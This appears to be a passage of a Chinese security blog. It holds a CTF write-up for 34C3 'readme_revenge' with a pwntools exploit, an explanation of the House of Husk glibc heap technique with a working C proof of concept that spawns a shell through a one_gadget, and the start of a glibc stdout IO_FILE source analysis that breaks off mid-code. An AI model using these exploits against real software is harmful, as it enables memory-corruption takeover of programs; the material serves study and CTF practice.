<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WARNING: <span class="function">Unsupported flag <span class="title">value</span><span class="params">(s)</span> of 0x%x in DT_FLAGS_1.</span></span><br></pre></td></tr></table></figure>
<p>看起来像是直接告诉我们 flag 一样，但是很可惜没有发现目标（这个字符串是某个函数自带的）</p>
<p>常规获取 flag 的思路看来解决不了问题，当时我就在想是不是像逆向一样直接把 flag 写死在文件里？一般比赛的 flag 都以比赛名开头，所以我直接搜“34C3”：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">00000000006B</span>4040                 <span class="keyword">public</span> flag</span><br><span class="line">.data:<span class="number">00000000006B</span>4040 flag            db <span class="string">&#x27;34C3_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&#x27;</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>发现 flag 了，因为程序开了 canary ，可以劫持 stack_chk_fail 的打印信息来泄露 flag</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RDI  <span class="number">0x48d187</span> ◂— imul   rbp, qword ptr [rax], <span class="number">0x202e7325</span> <span class="comment">/* &#x27;Hi, %s. Bye.\n&#x27; */</span></span><br><span class="line">RSI  <span class="number">0x6b73e0</span> (name) ◂— <span class="string">&#x27;aaaaaaaa&#x27;</span></span><br></pre></td></tr></table></figure>
<p>这就需要另一种攻击技术 House Of Husk 的帮助了：利用方法就是我们这里的 printf 注册函数的调用链，伪造 <code>__printf_arginfo_table</code> ，将 <code>table[&#39;s&#39;]</code> 改为 <code>_stack_chk_fail_local</code> 地址，将 <code>__libc_argv</code>（存放系统路径的地方） 改为输入地址，在输入开始存放 <code>flag_addr</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v14 = *(<span class="keyword">const</span> <span class="keyword">char</span> **)_libc_argv;</span><br><span class="line"><span class="keyword">if</span> ( !*(_QWORD *)_libc_argv )</span><br><span class="line">  v14 = <span class="string">&quot;&lt;unknown&gt;&quot;</span>;</span><br><span class="line">_libc_message(<span class="number">2u</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>, a7, a8, a9, a10, a11, a12, a13, a14, a1, v14, a5, a6); <span class="comment">/* 伪代码有点难看,这里只用注意V14 */</span></span><br></pre></td></tr></table></figure>
<p>这道题可以直接覆盖 <code>printf_arginfo_table</code> 和 <code>printf_function_table</code> 不需要借用 main_arena，想比常规的 House Of Husk 更为简单</p>
<p>先看exp吧：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;info&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./readme_revenge&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./readme_revenge&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_function_table = <span class="number">0x6b7a28</span></span><br><span class="line">printf_arginfo_table = <span class="number">0x6b7aa8</span></span><br><span class="line">input_start_addr = <span class="number">0x6b73e0</span></span><br><span class="line">stack_chk_fail = <span class="number">0x4359b0</span></span><br><span class="line">flag_addr = <span class="number">0x6b4040</span></span><br><span class="line">argv_addr = <span class="number">0x6b7980</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    payload = p64(flag_addr)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x73</span> * <span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment"># &#x27;s&#x27;的ascii值就是0x73</span></span><br><span class="line">    payload += p64(stack_chk_fail)<span class="comment"># 在&#x27;s&#x27;的spec索引中写入stack_chk_fail</span></span><br><span class="line">    payload = payload.ljust(argv_addr-input_start_addr,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += p64(input_start_addr)<span class="comment"># 在argv_addr中写入input_start_addr</span></span><br><span class="line">    payload = payload.ljust(printf_function_table-input_start_addr,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += p64(<span class="number">1</span>)<span class="comment">#在printf_function_table中写入&#x27;1&#x27;</span></span><br><span class="line">    payload = payload.ljust(printf_arginfo_table-input_start_addr,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += p64(input_start_addr)<span class="comment"># 在printf_arginfo_table中写入input_start_addr</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<p>这里就是把 input_start_addr (输入的起始地址) 当成 <code>printf_arginfo_table</code></p>
<hr>
<p><strong>小结：</strong></p>
<p>目前还是有点不懂该漏洞的运作原理，抛开漏洞利用不谈，我测试了正常情况的 <code>printf_arginfo_table</code> 和 <code>printf_function_table</code> ，发现它们都是NULL，所以我有点搞不懂这两个表在 printf 中的作用</p>
<p>不过程序可以打通是事实，我也只能认为程序会优先执行 <code>printf_arginfo_table</code> 里面所指向的解析函数了（虽然我在源码中没有找到依据）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/04/House%20Of%20Husk-%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/04/House%20Of%20Husk-%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">House Of Husk-原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-04-04 22:25:27 / Modified: 22:28:24" itemprop="dateCreated datePublished" datetime="2022-04-04T22:25:27+08:00">2022-04-04</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.1k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="House-Of-Husk"><a href="#House-Of-Husk" class="headerlink" title="House Of Husk"></a>House Of Husk</h2><p>这种攻击方式主要是利用了<code>printf</code>的一个调用链：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span> -&gt; <span class="built_in">vfprintf</span> -&gt; printf_positional -&gt; __parse_one_specmb -&gt; __printf_arginfo_table(spec) </span><br></pre></td></tr></table></figure>
<p>应用场景是：</p>
<ul>
<li>只能分配较大chunk时（超过fastbin）</li>
<li>存在或可以构造出UAF漏洞 </li>
</ul>
<hr>
<h2 id="House-Of-Husk-原理"><a href="#House-Of-Husk-原理" class="headerlink" title="House Of Husk 原理"></a>House Of Husk 原理</h2><p>使用 <code>printf</code> 类格式化字符串函数进行输出的时候，该类函数 <strong>会根据我们格式化字符串的种类不同而采取不同的输出格式进行输出</strong> ，在glibc中有这样一个函数 <code>__register_printf_function</code> ，为格式化字符为 <code>spec</code> 的格式化输出 <strong>注册函数</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="keyword">int</span> <span class="title">printf_function</span> <span class="params">(FILE *__stream,</span></span></span><br><span class="line"><span class="params"><span class="function">			     __const struct printf_info *__info,</span></span></span><br><span class="line"><span class="params"><span class="function">			     __const <span class="keyword">void</span> *__const *__args)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="keyword">int</span> <span class="title">printf_arginfo_function</span> <span class="params">(__const struct printf_info *__info,</span></span></span><br><span class="line"><span class="params"><span class="function">				     <span class="keyword">size_t</span> __n, <span class="keyword">int</span> *__argtypes)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> printf_function *printf_funcs[UCHAR_MAX + <span class="number">1</span>]; <span class="comment">/* 没什么用 */</span></span><br><span class="line"></span><br><span class="line">printf_function **__printf_function_table;</span><br><span class="line">printf_arginfo_function *__printf_arginfo_table[UCHAR_MAX + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">这里需要注意一下: </span></span><br><span class="line"><span class="comment">libc-2.23会把__printf_function_table初始化为一个函数指针 </span></span><br><span class="line"><span class="comment">libc-2.27会把__printf_function_table初始化为一个指针数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">__register_printf_function (spec, converter, arginfo)</span><br><span class="line">     <span class="keyword">int</span> spec;</span><br><span class="line">     printf_function converter;</span><br><span class="line">     printf_arginfo_function arginfo;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (spec &lt; <span class="number">0</span> || spec &gt; (<span class="keyword">int</span>) UCHAR_MAX)</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __printf_function_table = printf_funcs; </span><br><span class="line">  __printf_arginfo_table[spec] = arginfo;</span><br><span class="line">  printf_funcs[spec] = converter;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>__printf_function_table</code>：类型为 <code>printf_function</code> 的函数指针（printf_funcs），是我们为 chr(spec) 这个格式化字符 <strong>注册的输出函数的函数指针</strong> </li>
<li><code>__printf_arginfo_table</code>：类型为 <code>printf_arginfo_function</code> 的指针数组，[spec] 索引处的类型为 <code>printf_arginfo_size_function</code> 的函数指针是我们为 chr(spec) 这个格式化字符 <strong>注册的输出函数的另一个函数指针，其功能是根据格式化字符做解析</strong></li>
<li>这个 spec 索引就是格式化字符的 ascii 码值，比如：printf(“%s”)，那么这里的 spec 索引就是s的ascii码值</li>
</ul>
<p>当程序检测到 <code>printf_arginfo_function</code> 中，对应的 spec 索引中有函数指针时，程序就会尝试用该函数指针指向的函数来解析对应的 spec 索引（至于 <code>__printf_function_table</code> 会发生什么其实不重要，只要它不为空就好），如果里面装着 one_gadget 的话就获取 shell 了</p>
<p>House Of Husk 的一大核心则是伪造 <code>__printf_arginfo_table</code> 和 <code>__printf_function_table</code> </p>
<ul>
<li><code>__printf_arginfo_table</code> ：在对应的 spec 索引中写入 one_gadget</li>
<li><code>__printf_function_table</code> ：不为空就好</li>
</ul>
<p>至于怎么伪造这两个表呢？这是 House Of Husk 的又一大核心，看看下面的案例就清楚了</p>
<h2 id="House-Of-Husk-利用姿势"><a href="#House-Of-Husk-利用姿势" class="headerlink" title="House Of Husk 利用姿势"></a>House Of Husk 利用姿势</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Husk&#x27;s method - House of Husk</span></span><br><span class="line"><span class="comment"> * This PoC is supposed to be run with libc-2.27</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> offset2size(ofs) ((ofs) * 2 - 0x10)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAIN_ARENA       0x3ebc40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAIN_ARENA_DELTA 0x60</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GLOBAL_MAX_FAST  0x3ed940</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINTF_FUNCTABLE 0x3f0658</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRINTF_ARGINFO   0x3ec870</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ONE_GADGET       0x10a38c</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> libc_base;</span><br><span class="line">  <span class="keyword">char</span> *a[<span class="number">10</span>];</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>); <span class="comment">// make printf quiet</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* leak libc */</span></span><br><span class="line">  a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); </span><br><span class="line">    <span class="comment">/* 用于模拟UAF的chunk */</span></span><br><span class="line">  a[<span class="number">1</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA)); </span><br><span class="line">    <span class="comment">/* 用于伪造__printf_function_table */</span></span><br><span class="line">  a[<span class="number">2</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_ARGINFO - MAIN_ARENA));</span><br><span class="line">    <span class="comment">/* 用于伪造__printf_arginfo_table */</span></span><br><span class="line">  a[<span class="number">3</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); </span><br><span class="line">    <span class="comment">/* 防止和top chunk合并 */</span></span><br><span class="line">    </span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">0</span>]);</span><br><span class="line">  libc_base = *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)a[<span class="number">0</span>] - MAIN_ARENA - MAIN_ARENA_DELTA;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;libc @ 0x%lx\n&quot;</span>, libc_base);</span><br><span class="line">	<span class="comment">/* 释放a[0]同时泄露libc_base */</span></span><br><span class="line">    </span><br><span class="line">  <span class="comment">/* prepare fake printf arginfo table */</span></span><br><span class="line">  *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(a[<span class="number">2</span>] + (<span class="string">&#x27;X&#x27;</span> - <span class="number">2</span>) * <span class="number">8</span>) = libc_base + ONE_GADGET;</span><br><span class="line">    <span class="comment">/* 将__printf_arginfo_table[&#x27;X&#x27;]处的函数指针改为one_gadget */</span></span><br><span class="line">    <span class="comment">/* PS:这里的“-2”实际上是减去“presize”和“size” */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* unsorted bin attack */</span></span><br><span class="line">  *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(a[<span class="number">0</span>] + <span class="number">8</span>) = libc_base + GLOBAL_MAX_FAST - <span class="number">0x10</span>;</span><br><span class="line">  a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* overwrite global_max_fast */</span></span><br><span class="line">	<span class="comment">/* 使用unsorted bin attack,改写global_max_fast为main_arena+88,从而使得释放的所有块都按fastbin处理 */</span></span><br><span class="line">    </span><br><span class="line">  <span class="comment">/* overwrite __printf_arginfo_table */</span></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">1</span>]);<span class="comment">// __printf_function_table =&gt; a heap_addr which is not NULL</span></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">2</span>]);<span class="comment">// __printf_arginfo_table =&gt; one_gadget</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ignite! */</span></span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%X&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 gcc ./test.c -g -fPIE -no-pie -o test</span><br><span class="line">➜  桌面 patchelf --<span class="built_in">set</span>-interpreter /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.27</span><span class="number">-3u</span>buntu1_amd64/ld<span class="number">-2.27</span>.so --<span class="built_in">set</span>-rpath /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.27</span><span class="number">-3u</span>buntu1_amd64 test</span><br><span class="line">➜  桌面 ./test                               </span><br><span class="line">libc @ <span class="number">0x7f7edf71f000</span></span><br><span class="line"></span><br><span class="line">$ whoami</span><br><span class="line">yhellow</span><br></pre></td></tr></table></figure>
<ul>
<li>程序先利用 unsortedbin 泄露 libc_base</li>
<li>然后利用 UAF 来进行 unsortedbin attack 在 GLOBAL_MAX_FAST 中写入 main_arena + 88</li>
<li>接下来在 <code>fake __printf_arginfo_table</code> 中，把 ‘X’ 的 spec 索引替换为 one_gadget</li>
<li>最后的两个 free 会把 “a[1] , a[2]” 装入 fastbin 中，然后这两个表就已经成功覆盖了</li>
</ul>
<p>看上去很玄幻，但其实是利用了 main_arena 的特性：</p>
<p>fastbin 的堆块地址会存放在 <code>main_arena</code> 中，从 <code>main_arena+8</code> 存放 <code>fastbin[0x20]</code> 的头指针开始，一直往后推，由于平时的 fastbin 默认阈值为 <code>0x80</code> ，所以在 glibc-2.23 的环境下最多存放到 main_arena+0x48 ，现在我们将阈值改为 <code>main_arena + 88</code> 导致几乎所有 size 的 chunk 都被当做fastbin，其地址会从 main_arena+8 开始，根据 size 不同往 libc 覆写堆地址</p>
<p>所以只要 size 的大小合适，就可能会覆盖到 <code>__printf_arginfo_table</code> 和 <code>__printf_function_table</code></p>
<p><strong>利用条件</strong></p>
<ul>
<li>UAF</li>
<li>有修改模块</li>
<li>可以申请较大size的chunk</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/03/IO_FILE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9Astdout%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/03/IO_FILE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9Astdout%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99/" class="post-title-link" itemprop="url">IO_FILE源码分析：stdout任意读写</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-04-03 17:21:48 / Modified: 17:26:36" itemprop="dateCreated datePublished" datetime="2022-04-03T17:21:48+08:00">2022-04-03</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SourceCodeAnalysis/" itemprop="url" rel="index"><span itemprop="name">SourceCodeAnalysis</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="IO-FILE源码分析：stdout任意读写"><a href="#IO-FILE源码分析：stdout任意读写" class="headerlink" title="IO_FILE源码分析：stdout任意读写"></a>IO_FILE源码分析：stdout任意读写</h2><p><code>stdin</code> 只能输入数据到缓冲区，因此只能进行写，而 <code>stdout</code> 会将数据拷贝至输出缓冲区，并将输出缓冲区中的数据输出出来，所以如果可控 <code>stdout</code> 结构体，通过构造可实现利用其进行任意地址读以及任意地址写</p>
<p><strong>stdout任意写</strong></p>
<p>任意写的主要原理为：构造好输出缓冲区将其改为想要任意写的地址，当输出数据可控时，会将数据拷贝至输出缓冲区，即实现了将可控数据拷贝至我们想要写的地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> _IO_new_file_xsputn _IO_file_xsputn</span></span><br><span class="line"></span><br><span class="line">_IO_size_t</span><br><span class="line">_IO_new_file_xsputn (f, data, n) <span class="comment">/* n==request */</span></span><br><span class="line">     _IO_FILE *f;</span><br><span class="line">     <span class="keyword">const</span> <span class="keyword">void</span> *data;</span><br><span class="line">     _IO_size_t n;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">register</span> <span class="keyword">const</span> <span class="keyword">char</span> *s = (<span class="keyword">const</span> <span class="keyword">char</span> *) data;</span><br><span class="line">  _IO_size_t to_do = n;</span><br><span class="line">  <span class="keyword">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>) </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* 判断输出缓冲区还有多少空间 */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr; <span class="comment">/* 判断输出缓冲区还有多少空间 */</span></span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n) <span class="comment">/* 输出缓冲区够用 */</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">register</span> <span class="keyword">const</span> <span class="keyword">char</span> *p;</span><br><span class="line">	  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		  count = p - s + <span class="number">1</span>; <span class="comment">/* 重新调整输出缓冲区的可用size */</span></span><br><span class="line">		  must_flush = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>) <span class="comment">/* 如果输出缓冲区有空间，则先把数据拷贝至输出缓冲区 */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">	count = to_do;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">	&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line">	  f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, 